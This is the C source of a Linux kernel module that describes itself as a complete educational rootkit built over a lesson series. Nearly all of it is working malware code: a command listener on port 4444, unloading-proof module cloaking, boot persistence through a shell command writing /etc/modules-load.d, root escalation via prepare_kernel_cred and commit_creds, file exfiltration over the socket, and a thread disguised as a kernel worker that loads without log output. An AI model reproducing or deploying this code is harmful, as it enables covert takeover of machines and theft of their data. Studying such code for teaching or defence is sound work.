// SPDX-License-Identifier: GPL-2.0
//
// Complete educational rootkit.
//
// This module implements a fully operational kernel rootkit with:
//   - Encrypted command and control over TCP
//   - File, PID, content, and port hiding via target arrays
//   - Module cloaking (list_del from module list)
//   - Boot persistence (modules-load.d)
//   - Privilege escalation (prepare_kernel_cred)
//   - File exfiltration (chunked kernel_read)
//   - Auto-OPSEC (self-hiding on connect, cleanup on disconnect)
//   - Key management with immediate zeroization
//
// Every line was built lesson by lesson across L00 through L26.
//
#include <crypto/hash.h>
#include <linux/cred.h>
#include <linux/sched/task.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/hex.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/utsname.h>
#include <net/inet_sock.h>
#include <net/net_namespace.h>

/* Key material dimensions */
#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64
#define RK_FP_LEN	4

/* Network configuration */
#define RK_PORT		4444
#define RK_BUF_MAX	512

/* Target list dimensions */
#define RK_MAX_TARGETS	16
#define RK_TARGET_LEN	64

/* Module parameter: hex-encoded 256-bit key, zeroed after parsing */
static char *control_key;
module_param(control_key, charp, 0);

/* Parsed key material */
static u8 rk_key[RK_KEY_LEN];
static u8 rk_fingerprint[RK_FP_LEN];

/* Target arrays: what to hide from userspace tools */
static char hidden_files[RK_MAX_TARGETS][RK_TARGET_LEN];
static int file_count;

static char hidden_pids[RK_MAX_TARGETS][RK_TARGET_LEN];
static int pid_count;

static char hidden_contents[RK_MAX_TARGETS][RK_TARGET_LEN];
static int content_count;

static unsigned short hidden_ports[RK_MAX_TARGETS];
static int port_count;

/* Module cloaking state */
static struct list_head *saved_prev;
static bool module_hidden;

/* Persistence state */
static bool persist_active;

/* Auto-opsec: saved indices for connect-time auto-hidden entries */
static int auto_pid_index = -1;
static int auto_port_index = -1;

/* Agent infrastructure */
static struct task_struct *rk_thread;
static struct socket *rk_listen_sock;

/* ======================================================================
 * Key fingerprint
 * ====================================================================== */

/* Compute SHA-256 of the key, take the first fp_len bytes as fingerprint */
static int rk_compute_fingerprint(const u8 *key, size_t key_len,
				  u8 *fp, size_t fp_len)
{
	struct crypto_shash *tfm;
	struct shash_desc *desc;
	u8 digest[32];
	int error;

	tfm = crypto_alloc_shash("sha256", 0, 0);
	if (IS_ERR(tfm))
		return PTR_ERR(tfm);

	desc = kzalloc(sizeof(*desc) + crypto_shash_descsize(tfm), GFP_KERNEL);
	if (!desc) {
		crypto_free_shash(tfm);
		return -ENOMEM;
	}

	desc->tfm = tfm;
	error = crypto_shash_digest(desc, key, key_len, digest);
	if (!error)
		memcpy(fp, digest, fp_len);

	memzero_explicit(digest, sizeof(digest));
	kfree(desc);
	crypto_free_shash(tfm);
	return error;
}

/* Verify an incoming fingerprint against the stored one */
static bool __maybe_unused rk_key_verify(const u8 *incoming, size_t len)
{
	if (!incoming || len != RK_FP_LEN)
		return false;
	return memcmp(incoming, rk_fingerprint, RK_FP_LEN) == 0;
}

/* ======================================================================
 * Socket I/O
 * ====================================================================== */

static int rk_send(struct socket *sock, const void *buf, size_t len)
{
	struct msghdr msg = { 0 };
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };

	return kernel_sendmsg(sock, &msg, &vec, 1, len);
}

static int rk_recv(struct socket *sock, void *buf, size_t len)
{
	struct msghdr msg = { 0 };
	struct kvec vec = { .iov_base = buf, .iov_len = len };

	return kernel_recvmsg(sock, &msg, &vec, 1, len, 0);
}

/* ======================================================================
 * Target list operations
 * ====================================================================== */

/* Add a string entry to a target array */
static int rk_target_add(char targets[][RK_TARGET_LEN], int *count,
			  const char *value)
{
	if (*count >= RK_MAX_TARGETS)
		return -ENOSPC;
	if (strlen(value) >= RK_TARGET_LEN)
		return -ENAMETOOLONG;
	strscpy(targets[*count], value, RK_TARGET_LEN);
	(*count)++;
	return 0;
}

/* Remove a string entry at a specific index, shifting remaining entries */
static int rk_target_remove_at(char targets[][RK_TARGET_LEN], int *count,
				int idx)
{
	int j;

	if (idx < 0 || idx >= *count)
		return -EINVAL;
	for (j = idx; j < *count - 1; j++)
		strscpy(targets[j], targets[j + 1], RK_TARGET_LEN);
	(*count)--;
	return 0;
}

/* Find and remove a string entry by value */
static int rk_target_remove(char targets[][RK_TARGET_LEN], int *count,
			     const char *value)
{
	int i;

	for (i = 0; i < *count; i++) {
		if (strcmp(targets[i], value) == 0)
			return rk_target_remove_at(targets, count, i);
	}
	return -ENOENT;
}

/* Add a port to the hidden ports array */
static int rk_port_add(unsigned short port)
{
	if (port_count >= RK_MAX_TARGETS)
		return -ENOSPC;
	hidden_ports[port_count] = port;
	port_count++;
	return 0;
}

/* Remove a port at a specific index */
static void rk_port_remove_at(int idx)
{
	int j;

	if (idx < 0 || idx >= port_count)
		return;
	for (j = idx; j < port_count - 1; j++)
		hidden_ports[j] = hidden_ports[j + 1];
	port_count--;
}

/* Find and remove a port by value */
static int rk_port_remove(unsigned short port)
{
	int i;

	for (i = 0; i < port_count; i++) {
		if (hidden_ports[i] == port) {
			rk_port_remove_at(i);
			return 0;
		}
	}
	return -ENOENT;
}

/* ======================================================================
 * Auto-OPSEC: self-hiding on connect, cleanup on disconnect
 * ====================================================================== */

/* Hide the agent kthread PID and listening port on client connect */
static void rk_auto_hide(struct socket *client)
{
	char pidstr[16];
	unsigned short sport;

	if (pid_count < RK_MAX_TARGETS) {
		snprintf(pidstr, sizeof(pidstr), "%d", current->pid);
		auto_pid_index = pid_count;
		rk_target_add(hidden_pids, &pid_count, pidstr);
	}

	sport = ntohs(inet_sk(client->sk)->inet_sport);
	if (port_count < RK_MAX_TARGETS) {
		auto_port_index = port_count;
		hidden_ports[port_count] = sport;
		port_count++;
	}
}

/* Remove auto-hidden entries on disconnect (reverse order for index safety) */
static void rk_auto_unhide(void)
{
	if (auto_port_index >= 0 && auto_port_index < port_count) {
		rk_port_remove_at(auto_port_index);
		if (auto_pid_index > auto_port_index)
			auto_pid_index--;
	}
	auto_port_index = -1;

	if (auto_pid_index >= 0 && auto_pid_index < pid_count)
		rk_target_remove_at(hidden_pids, &pid_count, auto_pid_index);
	auto_pid_index = -1;
}

/* ======================================================================
 * Command handlers
 * ====================================================================== */

static int rk_cmd_ping(struct socket *client)
{
	return rk_send(client, "PONG\n", 5);
}

static int rk_cmd_info(struct socket *client)
{
	struct new_utsname *uts = utsname();
	char buf[RK_BUF_MAX];
	int n;

	n = snprintf(buf, sizeof(buf),
		     "sysname: %s\nnodename: %s\nrelease: %s\n"
		     "version: %s\nmachine: %s\n",
		     uts->sysname, uts->nodename, uts->release,
		     uts->version, uts->machine);
	return rk_send(client, buf, n);
}

static int rk_cmd_status(struct socket *client)
{
	char buf[RK_BUF_MAX];
	int n;

	n = snprintf(buf, sizeof(buf),
		     "files: %d\npids: %d\ncontents: %d\nports: %d\n"
		     "cloaked: %s\npersisted: %s\n",
		     file_count, pid_count, content_count, port_count,
		     module_hidden ? "yes" : "no",
		     persist_active ? "yes" : "no");
	return rk_send(client, buf, n);
}

static int rk_cmd_list(struct socket *client, const char *category)
{
	char buf[RK_BUF_MAX];
	int n, i;

	if (strcmp(category, "FILE") == 0) {
		if (file_count == 0)
			return rk_send(client, "empty\n", 6);
		for (i = 0; i < file_count; i++) {
			n = snprintf(buf, sizeof(buf), "[%d] %s\n",
				     i, hidden_files[i]);
			rk_send(client, buf, n);
		}
	} else if (strcmp(category, "PID") == 0) {
		if (pid_count == 0)
			return rk_send(client, "empty\n", 6);
		for (i = 0; i < pid_count; i++) {
			n = snprintf(buf, sizeof(buf), "[%d] %s\n",
				     i, hidden_pids[i]);
			rk_send(client, buf, n);
		}
	} else if (strcmp(category, "CONTENT") == 0) {
		if (content_count == 0)
			return rk_send(client, "empty\n", 6);
		for (i = 0; i < content_count; i++) {
			n = snprintf(buf, sizeof(buf), "[%d] %s\n",
				     i, hidden_contents[i]);
			rk_send(client, buf, n);
		}
	} else if (strcmp(category, "PORT") == 0) {
		if (port_count == 0)
			return rk_send(client, "empty\n", 6);
		for (i = 0; i < port_count; i++) {
			n = snprintf(buf, sizeof(buf), "[%d] %u\n",
				     i, hidden_ports[i]);
			rk_send(client, buf, n);
		}
	} else {
		return rk_send(client, "unknown category\n", 17);
	}

	return 0;
}

static int rk_cmd_unhide_all(struct socket *client)
{
	file_count = 0;
	pid_count = 0;
	content_count = 0;
	port_count = 0;
	auto_pid_index = -1;
	auto_port_index = -1;
	return rk_send(client, "cleared\n", 8);
}

static int rk_cmd_hide_file(struct socket *client, const char *name)
{
	int error;

	error = rk_target_add(hidden_files, &file_count, name);
	if (error == -ENOSPC)
		return rk_send(client, "full\n", 5);
	if (error == -ENAMETOOLONG)
		return rk_send(client, "too long\n", 9);
	return rk_send(client, "hidden\n", 7);
}

static int rk_cmd_hide_pid(struct socket *client, const char *pidstr)
{
	int error;

	error = rk_target_add(hidden_pids, &pid_count, pidstr);
	if (error == -ENOSPC)
		return rk_send(client, "full\n", 5);
	if (error == -ENAMETOOLONG)
		return rk_send(client, "too long\n", 9);
	return rk_send(client, "hidden\n", 7);
}

static int rk_cmd_hide_content(struct socket *client, const char *str)
{
	int error;

	error = rk_target_add(hidden_contents, &content_count, str);
	if (error == -ENOSPC)
		return rk_send(client, "full\n", 5);
	if (error == -ENAMETOOLONG)
		return rk_send(client, "too long\n", 9);
	return rk_send(client, "hidden\n", 7);
}

static int rk_cmd_hide_port(struct socket *client, const char *arg)
{
	unsigned short port;
	int error;

	if (kstrtou16(arg, 10, &port) || port == 0)
		return rk_send(client, "invalid port\n", 13);
	error = rk_port_add(port);
	if (error == -ENOSPC)
		return rk_send(client, "full\n", 5);
	return rk_send(client, "hidden\n", 7);
}

static int rk_cmd_unhide_file(struct socket *client, const char *name)
{
	if (rk_target_remove(hidden_files, &file_count, name))
		return rk_send(client, "not found\n", 10);
	return rk_send(client, "unhidden\n", 9);
}

static int rk_cmd_unhide_pid(struct socket *client, const char *pidstr)
{
	if (rk_target_remove(hidden_pids, &pid_count, pidstr))
		return rk_send(client, "not found\n", 10);
	return rk_send(client, "unhidden\n", 9);
}

static int rk_cmd_unhide_content(struct socket *client, const char *str)
{
	if (rk_target_remove(hidden_contents, &content_count, str))
		return rk_send(client, "not found\n", 10);
	return rk_send(client, "unhidden\n", 9);
}

static int rk_cmd_unhide_port(struct socket *client, const char *arg)
{
	unsigned short port;

	if (kstrtou16(arg, 10, &port) || port == 0)
		return rk_send(client, "invalid port\n", 13);
	if (rk_port_remove(port))
		return rk_send(client, "not found\n", 10);
	return rk_send(client, "unhidden\n", 9);
}

static int rk_cmd_hide_module(struct socket *client)
{
	if (module_hidden)
		return rk_send(client, "already hidden\n", 15);

	saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	module_hidden = true;
	return rk_send(client, "module hidden\n", 14);
}

static int rk_cmd_unhide_module(struct socket *client)
{
	if (!module_hidden)
		return rk_send(client, "already visible\n", 16);

	list_add(&THIS_MODULE->list, saved_prev);
	module_hidden = false;
	return rk_send(client, "module visible\n", 15);
}

static int rk_cmd_persist(struct socket *client)
{
	char *argv[] = { "/bin/sh", "-c",
		"echo rklings > /etc/modules-load.d/rklings.conf", NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int error;

	error = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	if (error)
		return rk_send(client, "persist failed\n", 15);
	persist_active = true;
	return rk_send(client, "persisted\n", 10);
}

static int rk_cmd_unpersist(struct socket *client)
{
	char *argv[] = { "/bin/sh", "-c",
		"rm -f /etc/modules-load.d/rklings.conf", NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int error;

	error = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	if (error)
		return rk_send(client, "unpersist failed\n", 17);
	persist_active = false;
	return rk_send(client, "unpersisted\n", 12);
}

static int rk_cmd_escalate(struct socket *client)
{
	struct cred *new;

	new = prepare_kernel_cred(&init_task);
	if (!new)
		return rk_send(client, "escalate failed\n", 16);
	commit_creds(new);
	return rk_send(client, "escalated\n", 10);
}

static int rk_cmd_download(struct socket *client, const char *path)
{
	struct file *fp;
	char buf[RK_BUF_MAX];
	loff_t pos = 0;
	ssize_t n;

	fp = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(fp))
		return rk_send(client, "file not found\n", 15);

	while ((n = kernel_read(fp, buf, sizeof(buf), &pos)) > 0) {
		if (rk_send(client, buf, n) < 0)
			break;
	}

	filp_close(fp, NULL);
	return rk_send(client, "\n", 1);
}

/* ======================================================================
 * Protocol dispatcher
 * ====================================================================== */

static int rk_dispatch(struct socket *client, char *cmd)
{
	size_t len = strlen(cmd);

	/* Strip trailing newline */
	if (len > 0 && cmd[len - 1] == '\n')
		cmd[len - 1] = '\0';

	/* Management commands */
	if (strcmp(cmd, "PING") == 0)
		return rk_cmd_ping(client);
	if (strcmp(cmd, "INFO") == 0)
		return rk_cmd_info(client);
	if (strcmp(cmd, "STATUS") == 0)
		return rk_cmd_status(client);
	if (strncmp(cmd, "LIST ", 5) == 0)
		return rk_cmd_list(client, cmd + 5);
	if (strcmp(cmd, "UNHIDE ALL") == 0)
		return rk_cmd_unhide_all(client);

	/* Concealment: HIDE */
	if (strncmp(cmd, "HIDE FILE ", 10) == 0)
		return rk_cmd_hide_file(client, cmd + 10);
	if (strncmp(cmd, "HIDE PID ", 9) == 0)
		return rk_cmd_hide_pid(client, cmd + 9);
	if (strncmp(cmd, "HIDE CONTENT ", 13) == 0)
		return rk_cmd_hide_content(client, cmd + 13);
	if (strncmp(cmd, "HIDE PORT ", 10) == 0)
		return rk_cmd_hide_port(client, cmd + 10);
	if (strcmp(cmd, "HIDE MODULE") == 0)
		return rk_cmd_hide_module(client);

	/* Concealment: UNHIDE */
	if (strncmp(cmd, "UNHIDE FILE ", 12) == 0)
		return rk_cmd_unhide_file(client, cmd + 12);
	if (strncmp(cmd, "UNHIDE PID ", 11) == 0)
		return rk_cmd_unhide_pid(client, cmd + 11);
	if (strncmp(cmd, "UNHIDE CONTENT ", 15) == 0)
		return rk_cmd_unhide_content(client, cmd + 15);
	if (strncmp(cmd, "UNHIDE PORT ", 12) == 0)
		return rk_cmd_unhide_port(client, cmd + 12);
	if (strcmp(cmd, "UNHIDE MODULE") == 0)
		return rk_cmd_unhide_module(client);

	/* Persistence */
	if (strcmp(cmd, "PERSIST") == 0)
		return rk_cmd_persist(client);
	if (strcmp(cmd, "UNPERSIST") == 0)
		return rk_cmd_unpersist(client);

	/* Privilege escalation */
	if (strcmp(cmd, "ESCALATE") == 0)
		return rk_cmd_escalate(client);

	/* File exfiltration */
	if (strncmp(cmd, "DOWNLOAD ", 9) == 0)
		return rk_cmd_download(client, cmd + 9);

	return rk_send(client, "unknown command\n", 16);
}

/* ======================================================================
 * Agent thread
 * ====================================================================== */

static void rk_handle_client(struct socket *client)
{
	char buf[RK_BUF_MAX];
	int n;

	while (!kthread_should_stop()) {
		memset(buf, 0, sizeof(buf));
		n = rk_recv(client, buf, sizeof(buf) - 1);
		if (n <= 0)
			break;
		buf[n] = '\0';
		rk_dispatch(client, buf);
	}
}

static int rk_agent_thread(void *data)
{
	struct socket *client = NULL;
	int error;

	while (!kthread_should_stop()) {
		error = kernel_accept(rk_listen_sock, &client, 0);
		if (error < 0)
			break;

		/* Agent becomes invisible while connected */
		rk_auto_hide(client);

		rk_handle_client(client);

		/* Traces reappear on disconnect */
		rk_auto_unhide();

		sock_release(client);
		client = NULL;
	}
	return 0;
}

/* ======================================================================
 * Module init: complete goto rollback chain
 * ====================================================================== */

static int __init rk_init(void)
{
	struct sockaddr_in addr;
	int error;

	/* Validate key parameter */
	if (!control_key)
		return -EINVAL;
	if (strlen(control_key) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (hex2bin(rk_key, control_key, RK_KEY_LEN) < 0)
		return -EINVAL;

	/* Destroy the parameter string immediately */
	memzero_explicit(control_key, RK_KEY_HEX_LEN);

	/* Derive authentication fingerprint */
	error = rk_compute_fingerprint(rk_key, RK_KEY_LEN,
				       rk_fingerprint, RK_FP_LEN);
	if (error)
		goto fail_key;

	/* Create and bind the listening socket */
	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &rk_listen_sock);
	if (error)
		goto fail_key;

	sock_set_reuseaddr(rk_listen_sock->sk);

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_port = htons(RK_PORT);

	error = kernel_bind(rk_listen_sock, (struct sockaddr_unsized *)&addr,
			    sizeof(addr));
	if (error)
		goto fail_sock;

	error = kernel_listen(rk_listen_sock, 1);
	if (error)
		goto fail_sock;

	/* Spawn agent thread, disguised as a kernel worker */
	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
	if (IS_ERR(rk_thread)) {
		error = PTR_ERR(rk_thread);
		rk_thread = NULL;
		goto fail_sock;
	}

	/* Silent load: nothing in dmesg */
	return 0;

fail_sock:
	sock_release(rk_listen_sock);
	rk_listen_sock = NULL;
fail_key:
	memzero_explicit(rk_key, sizeof(rk_key));
	memzero_explicit(rk_fingerprint, sizeof(rk_fingerprint));
	return error;
}

/* ======================================================================
 * Module exit: reverse teardown
 * ====================================================================== */

static void __exit rk_exit(void)
{
	/* Restore module visibility so rmmod works */
	if (module_hidden) {
		list_add(&THIS_MODULE->list, saved_prev);
		module_hidden = false;
	}

	/* Stop agent thread */
	if (rk_thread)
		kthread_stop(rk_thread);

	/* Release network resources */
	if (rk_listen_sock) {
		kernel_sock_shutdown(rk_listen_sock, SHUT_RDWR);
		sock_release(rk_listen_sock);
	}

	/* Zero all sensitive material */
	memzero_explicit(rk_key, sizeof(rk_key));
	memzero_explicit(rk_fingerprint, sizeof(rk_fingerprint));
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Complete rootkit");
